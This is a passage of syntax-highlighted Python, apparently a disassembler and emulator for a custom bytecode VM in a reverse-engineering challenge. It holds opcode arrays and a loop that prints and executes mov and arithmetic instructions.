class="hljs-number">161</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">204</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">204</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>,<br>          <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">204</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">204</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">204</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">204</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">204</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">192</span>, <span class="hljs-number">246</span>,<br>          <span class="hljs-number">248</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">92</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">204</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">204</span>, <span class="hljs-number">1</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">150</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>,<br>          <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">32</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">192</span>, <span class="hljs-number">246</span>, <span class="hljs-number">248</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">6</span>, <span class="hljs-number">236</span>, <span class="hljs-number">254</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">192</span>, <span class="hljs-number">246</span>, <span class="hljs-number">248</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">189</span>, <span class="hljs-number">254</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">99</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">150</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">250</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">192</span>, <span class="hljs-number">246</span>, <span class="hljs-number">248</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">21</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">47</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>,<br>          <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">192</span>, <span class="hljs-number">246</span>, <span class="hljs-number">248</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">69</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">154</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">201</span>, <span class="hljs-number">195</span>]<br><br>signal = [<span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>,<br>          <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>          <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">11</span>, <span class="hljs-number">8</span>, <span class="hljs-number">11</span>, <span class="hljs-number">4</span>, <span class="hljs-number">11</span>]<br><br>vm_regs = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br><br>rip = <span class="hljs-number">0</span><br>regs_16 = <span class="hljs-number">0</span><br><br>v14 = <span class="hljs-number">0</span><br><br>Almost = [<span class="hljs-number">65</span>, <span class="hljs-number">108</span>, <span class="hljs-number">109</span>, <span class="hljs-number">111</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">32</span>, <span class="hljs-number">104</span>, <span class="hljs-number">101</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">101</span>, <span class="hljs-number">110</span>, <span class="hljs-number">32</span>, <span class="hljs-number">119</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">32</span>, <span class="hljs-number">118</span>, <span class="hljs-number">105</span>, <span class="hljs-number">114</span>, <span class="hljs-number">103</span>,<br>          <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">105</span>, <span class="hljs-number">97</span>, <span class="hljs-number">44</span>, <span class="hljs-number">32</span>, <span class="hljs-number">98</span>, <span class="hljs-number">108</span>, <span class="hljs-number">117</span>, <span class="hljs-number">101</span>, <span class="hljs-number">32</span>, <span class="hljs-number">114</span>, <span class="hljs-number">105</span>, <span class="hljs-number">100</span>, <span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">32</span>, <span class="hljs-number">109</span>, <span class="hljs-number">111</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">97</span>,<br>          <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">115</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>] <br><br>dword = <span class="hljs-number">0</span><br><br>if_cc = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> signal:<br>    rip = regs_16<br>    <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">0xcc</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;cc&#x27;</span>.rjust(<span class="hljs-number">16</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>&#x27;</span>)<br>        rip += <span class="hljs-number">1</span><br>        regs_16 += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">48</span> <span class="hljs-keyword">and</span> opcode[rip + <span class="hljs-number">1</span>] == <span class="hljs-number">192</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(<span class="hljs-number">48</span>)[<span class="hljs-number">2</span>:]&#125;</span><span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(<span class="hljs-number">192</span>)[<span class="hljs-number">2</span>:]&#125;</span>&#x27;</span>.rjust(<span class="hljs-number">16</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span>&#x27;</span>)<br>        rip += <span class="hljs-number">2</span><br>        <span class="hljs-comment"># if_cc = 1</span><br>        regs_16 += <span class="hljs-number">2</span><br><br>    <span class="hljs-comment"># if  opcode[rip] == 0x00 and opcode[rip + 1] == 0x00 and opcode[rip + 2] == 0x02 and opcode[rip + 3] == 214:</span><br>    <span class="hljs-comment">#     print(f&#x27;&#123;hex(0)[2:].zfill(2)&#125;&#123;hex(0)[2:].zfill(2)&#125;&#123;hex(2)[2:].zfill(2)&#125;&#123;hex(214)[2:]&#125;&#x27;.rjust(16), end=&#x27; &#x27;)</span><br>    <span class="hljs-comment">#     print(f&#x27;&#123;hex(rip)[2:].zfill(4)&#125;&#x27;)</span><br>    <span class="hljs-comment">#     rip += 4</span><br>    <span class="hljs-comment">#     # if_cc = 1</span><br>    <span class="hljs-comment">#     regs_16 += 4</span><br><br><br>    <span class="hljs-keyword">if</span> i == <span class="hljs-number">4</span>:<br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">1</span>] == <span class="hljs-number">1</span>:<br>            v14 = c_int32(<span class="hljs-built_in">int</span>(pack(<span class="hljs-string">&#x27;&lt;BBBB&#x27;</span>, opcode[rip+<span class="hljs-number">6</span>], opcode[rip + <span class="hljs-number">5</span>], opcode[rip + <span class="hljs-number">4</span>], opcode[rip + <span class="hljs-number">3</span>]).<span class="hljs-built_in">hex</span>(),base=<span class="hljs-number">16</span>)).value<br>            regs_16 += <span class="hljs-number">7</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(k)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> opcode[rip:rip + <span class="hljs-number">7</span>]]).rjust(<span class="hljs-number">16</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            v14 = opcode[rip + <span class="hljs-number">3</span>]<br>            regs_16 += <span class="hljs-number">4</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(k)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> opcode[rip:rip + <span class="hljs-number">4</span>]]).rjust(<span class="hljs-number">16</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">1</span>] == <span class="hljs-number">1</span>:<br>            vm_regs[opcode[rip + <span class="hljs-number">2</span>]] = v14<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> mov vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>,<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">1</span>] == <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> mov vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>,Almost<span class="hljs-subst">&#123;[vm_regs[v14]]&#125;</span>&#x27;</span>)<br>            vm_regs[opcode[rip + <span class="hljs-number">2</span>]] = Almost[vm_regs[v14]]<br><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">1</span>] == <span class="hljs-number">32</span>:<br>            Almost[vm_regs[opcode[rip + <span class="hljs-number">2</span>]]] = vm_regs[v14]<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> mov Almost<span class="hljs-subst">&#123;[vm_regs[opcode[rip + <span class="hljs-number">3</span>]]]&#125;</span>,vm_regs_<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> mov vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>,vm_regs_<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>            vm_regs[opcode[rip + <span class="hljs-number">2</span>]] = vm_regs[v14]<br><br><br>    <span class="hljs-keyword">if</span> i == <span class="hljs-number">5</span>:<br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">1</span>] == <span class="hljs-number">1</span>:<br>            regs_16 += <span class="hljs-number">7</span><br>            v14 = c_int32(<span class="hljs-built_in">int</span>(pack(<span class="hljs-string">&#x27;&lt;BBBB&#x27;</span>, opcode[rip + <span class="hljs-number">6</span>], opcode[rip + <span class="hljs-number">5</span>], opcode[rip + <span class="hljs-number">4</span>], opcode[rip + <span class="hljs-number">3</span>]).<span class="hljs-built_in">hex</span>(),base=<span class="hljs-number">16</span>)).value<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(k)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> opcode[rip:rip + <span class="hljs-number">7</span>]]).rjust(<span class="hljs-number">16</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<br>            regs_16 += <span class="hljs-number">4</span><br>            v14 = vm_regs[opcode[rip + <span class="hljs-number">3</span>]]<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(k)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> opcode[rip:rip + <span class="hljs-number">4</span>]]).rjust(<span class="hljs-number">16</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">0</span>:<br>            <span class="hljs-comment"># print(&#x27;debug:&#x27;,i)</span><br>            vm_regs[opcode[rip + <span class="hljs-number">2</span>]] += v14<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> add vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>,vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">1</span>:<br>            vm_regs[opcode[rip + <span class="hljs-number">2</span>]] -= v14<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> sub vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>,vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">2</span>:<br>            vm_regs[opcode[rip + <span class="hljs-number">2</span>]] *= v14<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> mul vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>,vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">3</span>:<br>            vm_regs[opcode[rip + <span class="hljs-number">2</span>]] /= v14<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> div vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>,vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">4</span>:<br>            vm_regs[opcode[rip + <span class="hljs-number">2</span>]] %= v14<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span 